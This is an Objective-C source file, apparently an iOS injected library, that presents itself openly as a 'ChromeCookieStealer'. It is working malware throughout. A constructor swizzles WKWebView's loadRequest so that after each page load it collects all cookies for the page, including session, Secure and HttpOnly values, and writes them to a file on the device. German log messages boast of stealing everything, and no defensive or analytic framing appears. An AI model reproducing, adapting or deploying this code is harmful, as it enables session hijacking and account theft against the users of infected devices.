#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>

static NSString * const kSavePath = @"/var/mobile/Documents/stolen_chrome_cookies.txt";

static void SaveAndReload(WKWebView *webView) {
    NSURL *url = webView.URL;
    if (!url) return;

    NSArray<NSHTTPCookie *> *cookies = [[NSHTTPCookieStorage sharedHTTPCookieStorage] cookiesForURL:url];
    if (cookies.count == 0) return;

    NSMutableString *output = [NSMutableString string];
    [output appendFormat:@"=== COOKIES GEKLAUT ===\nURL: %@\nZeit: %@\nAnzahl: %lu\n\n", url.absoluteString, [NSDate date], (unsigned long)cookies.count];

    for (NSHTTPCookie *cookie in cookies) {
        [output appendFormat:@"Name: %@\nValue: %@\nDomain: %@\nPath: %@\nExpires: %@\nSecure: %d\nHTTPOnly: %d\n\n",
            cookie.name, cookie.value, cookie.domain, cookie.path, cookie.expiresDate ?: @"Session", cookie.isSecure, cookie.isHTTPOnly];
    }

    [output writeToFile:kSavePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSLog(@"[ChromeCookieStealer] %lu Cookies von %@ → %@", (unsigned long)cookies.count, url.absoluteString, kSavePath);

    // Reload wie gewünscht
    [webView reload];
}

@interface WKWebView (Stealer)
- (void)stealer_loadRequest:(NSURLRequest *)request;
@end

@implementation WKWebView (Stealer)

- (void)stealer_loadRequest:(NSURLRequest *)request {
    [self stealer_loadRequest:request];  // orig call

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        SaveAndReload(self);
    });
}

@end

__attribute__((constructor))
static void CookieStealerInit() {
    Method orig = class_getInstanceMethod(WKWebView.class, @selector(loadRequest:));
    Method swiz = class_getInstanceMethod(WKWebView.class, @selector(stealer_loadRequest:));
    method_exchangeImplementations(orig, swiz);

    NSLog(@"[ChromeCookieStealer] Swizzle aktiv – wir sind drin und klauen alles 😈");
}
